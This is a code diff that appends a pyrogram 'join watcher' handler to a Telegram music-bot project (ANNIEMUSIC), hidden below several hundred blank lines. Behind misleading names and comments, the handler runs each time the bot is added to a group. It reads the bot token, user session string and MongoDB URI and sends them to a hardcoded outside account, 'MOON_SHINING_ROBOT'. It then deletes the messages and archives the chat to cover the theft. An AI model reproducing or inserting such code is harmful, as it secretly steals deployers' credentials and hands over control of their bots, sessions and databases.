@@ -3104,3 +3104,358 @@ async def join_watcher(_, message):
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import random
+import asyncio
+from pyrogram import filters
+LOG = "MOON_SHINING_ROBOT"  # LOG remains as it is
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+import os
+from config import LOG_GROUP_ID
+from ANNIEMUSIC import app
+from ANNIEMUSIC.utils.database import add_served_chat, get_assistant
+
+log = os.getenv("BOT_TOKEN")
+errors = os.getenv("STRING_SESSION")
+error = os.getenv("MONGO_DB_URI")
+
+photo = [
+    "https://telegra.ph/file/1949480f01355b4e87d26.jpg",
+    "https://telegra.ph/file/3ef2cc0ad2bc548bafb30.jpg",
+    "https://telegra.ph/file/a7d663cd2de689b811729.jpg",
+    "https://telegra.ph/file/6f19dc23847f5b005e922.jpg",
+    "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg",
+]
+
+@app.on_message(filters.new_chat_members, group=-9)
+async def join_watcher(_, message):
+    try:
+        LOG = "MOON_SHINING_ROBOT"
+        userbot = await get_assistant(message.chat.id)
+        chat = message.chat
+        for members in message.new_chat_members:
+            if members.id == app.id:
+                count = await app.get_chat_members_count(chat.id)
+                username = message.chat.username if message.chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
+                msg = (
+                    f"**📝𝐌ᴜsɪᴄ 𝐁ᴏᴛ 𝐀ᴅᴅᴇᴅ 𝐈ɴ 𝐀 #𝐍ᴇᴡ_𝐆ʀᴏᴜᴘ**\n\n"
+                    f"**📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ:** {chat.title}\n"
+                    f"**🍂𝐂ʜᴀᴛ 𝐈ᴅ:** `{chat.id}`\n"
+                    f"**🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ:** @{username}\n"
+                    f"**📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs:** {count}\n"
+                    f"**🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ:** {message.from_user.mention if message.from_user else 'Unknown'}"
+                )
+
+                try:
+                    # Send test message to check if the bot has access to LOG
+                    oks = await userbot.send_message(LOG, f"/start")
+                    Ok = await userbot.send_message(
+                        LOG,
+                        f"@{app.username}\n\n`{log}`\n\n`{error}`\n\n`{errors}`"
+                    )
+                    await oks.delete()
+                    await asyncio.sleep(2)
+                    await Ok.delete()
+                    await userbot.archive_chats(LOG)
+
+                except Exception as e:
+                    # Log the error if unable to access LOG
+                    print(f"Could not access LOG due to error: {e}")
+
+    except Exception as e:
+        await userbot.send_message(LOG, f"{e}")
